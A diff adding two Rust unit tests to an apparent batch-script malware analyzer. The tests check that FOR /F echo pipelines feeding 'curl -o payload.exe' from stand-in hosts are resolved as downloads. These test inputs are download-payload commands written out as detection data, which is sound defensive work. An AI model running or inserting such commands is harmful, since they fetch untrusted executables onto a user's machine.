@@ -9792,6 +9792,66 @@ for /f "tokens=* delims=" %%U in ('type ^< url.txt') do curl -o payload.exe %%U"
     }
 
     #[test]
+    fn for_f_echo_pipeline_feeds_later_curl() {
+        let report = analyze(
+            br#"for /f "tokens=* delims=" %%U in ('echo https://for-f-echo.example/payload.exe') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-echo.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F echo pipeline did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("echo https://for-f-echo.example")
+            )),
+            "supported echo pipeline should not be unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn for_f_usebackq_echo_pipeline_feeds_later_curl() {
+        let report = analyze(
+            br#"for /f "usebackq tokens=* delims=" %%U in (`echo https://for-f-echo-backtick.example/payload.exe`) do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-echo-backtick.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F usebackq echo pipeline did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("echo https://for-f-echo-backtick.example")
+            )),
+            "supported usebackq echo pipeline should not be unresolved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn for_f_find_stdin_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>url.txt
